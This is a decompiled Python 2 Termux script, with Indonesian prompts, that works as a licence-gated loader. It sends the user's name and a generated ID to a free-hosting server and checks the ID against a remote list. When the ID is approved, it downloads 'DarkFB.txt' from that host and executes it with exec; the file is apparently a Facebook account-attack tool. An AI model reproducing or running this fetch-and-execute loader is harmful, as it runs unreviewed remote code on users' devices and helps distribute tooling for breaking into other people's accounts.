# Decompile At :  Sat Mar  7 16:30:09 2020
import sys,os,smtplib,requests,random,time,getpass

try:
    file = "/data/data/com.termux/files/usr/etc/nanda.token"
    fileopen = open(file).read()
    fulus = "/data/data/com.termux/files/usr/etc/namauser.nm"
    fulusopen = open(fulus).read()
    lis = requests.get("https://nandaservering.000webhostapp.com/confirm.txt").text
    list = lis.split("\n")
    if fileopen in list:
       os.system("clear")
       print "\x1b[1;32mWelcome " + fulusopen
       time.sleep(3)
       print "\x1b[1;33m Jangan lupa subscribe my channel"
       time.sleep(2)
       os.system("am start https://www.youtube.com/channel/UCEeFnUSEk76MYuYzA9kSYTA?sub_confirmation=1")
       urlsc = requests.get("https://nandaservering.000webhostapp.com/DarkFB.txt").text
       exec urlsc
    else:
       os.system("clear")
       print "\x1b[1;31m[!]\x1b[1;33m Your ID : \x1b[1;32m" + fileopen
       print "\x1b[1;31m[!]\x1b[1;35m Maaf,Anda Belum Di Konfirmasi"
       print "\x1b[1;31m[!]\x1b[1;32m Silahkan Meminta Konfirmasi Dari Ananda"
       getpass.getpass("\x1b[1;33mTekan Enter Untuk Mengirim Pesan[+]")
       psn = ("confirm saya dengan username : ").replace(" ", "%20")
       os.system("am start https://wa.me/62895366772595?text=" + psn + fulusopen )

except IOError:
    generate1 = ''.join(random.sample(map(chr, range(48, 57) + range(65, 90) + range(97, 122)), 16))
    generate2 = ''.join(random.sample(map(chr, range(48, 57) + range(65, 90) + range(97, 122)), 16))
    generate = generate1 + generate2
    gen = open("/data/data/com.termux/files/usr/etc/nanda.token", "w")
    gen.write(generate)
    gen.close()
    os.system("clear")
    print "\x1b[1;34m[!]\x1b[1;33m ID ANDA : \x1b[1;32m" + generate
    namalu = raw_input("Siapa Nama Anda : ")
    nam = open("/data/data/com.termux/files/usr/etc/namauser.nm", "w")
    nam.write(namalu)
    nam.close()
    a = requests.post("https://nandaservering.000webhostapp.com/new.php",data = {"req":(str(namalu)) + " ===> " + (str(generate))})
    psn = ("confirm saya dengan username : ").replace(" ", "%20")
    os.system("am start https://wa.me/62895366772595?text=" + psn + namalu )
except KeyboardInterrupt,EOFError:
    pass
